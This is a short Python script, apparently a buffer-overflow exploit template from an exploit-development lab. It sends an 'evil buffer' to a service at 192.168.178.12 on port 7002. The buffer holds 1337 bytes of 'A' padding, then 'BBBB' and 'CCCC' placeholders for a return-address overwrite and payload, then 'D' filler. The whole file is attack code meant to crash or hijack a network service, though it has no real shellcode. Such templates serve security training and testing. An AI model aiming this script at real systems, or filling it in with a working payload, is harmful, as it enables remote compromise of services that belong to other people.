#!/usr/bin/env python3
import socket

offset = 1337
buffer_size = 4242

target_ip = "192.168.178.12"
target_port = 7002

try:
    
    buf = b""
    buf += b"A" * offset
    buf += b"BBBB"
    buf += b"CCCC"
    buf += b"D" * (buffer_size - len(buf))

    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target_ip, target_port))

    print("Sending evil buffer with %s bytes" % buffer_size)

    # s.recv(1024) # receive data if relevant
    s.send(buf)
    s.close()
  
    print("Done!")

except:
    print("Crash or could not connect!")
